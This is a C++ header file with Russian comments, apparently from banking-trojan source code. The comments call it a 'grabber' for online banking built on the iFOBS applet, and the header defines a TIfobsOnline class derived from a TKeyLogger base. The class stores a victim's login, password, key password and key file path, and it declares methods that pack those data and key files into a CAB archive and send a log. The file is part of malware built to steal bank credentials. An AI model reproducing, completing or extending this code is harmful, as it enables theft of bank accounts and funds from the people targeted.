
//===========================================================================
//  Грабер онланбанка работающего на Ifobs аплете
//
//  Модифицирован: Декабрь 2012
//  Версия:        1.0
//===========================================================================

#ifndef IfobsOnlineH
#define IfobsOnlineH
//---------------------------------------------------------------------------

#include "KeyLogger.h"


#define IFOBS_MAX_KEY_PATH_SIZE  3145728   /* Макс 3 мегабайта */


namespace IfobsOnline
{
	// Функция активирует грабер IfobsOnline
    bool Initialize();
}




class TIfobsOnline : public TKeyLogger
{
private:
	string FLogin;
	string FPassword;
	string FKeyPassword;
	string FKeyFilePath;

	string PackData();
	void AddFilesToCab(LPVOID Cab);
	void AddWndData(HWND Wnd);
	bool BindData();

	friend BOOL CALLBACK IfobsOnlineEnumWndProc(HWND Wnd, LPARAM Data);
public:
	TIfobsOnline();
	~TIfobsOnline() {};
	void SendLog();
};


//---------------------------------------------------------------------------
#endif
